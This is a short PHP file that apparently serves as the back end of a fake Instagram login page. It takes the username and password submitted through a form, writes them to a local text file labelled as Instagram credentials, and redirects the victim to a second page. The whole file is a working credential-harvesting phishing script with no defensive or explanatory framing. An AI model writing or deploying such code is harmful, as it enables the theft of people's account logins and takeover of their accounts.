<?php
file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: login2.html.php');
exit();
?>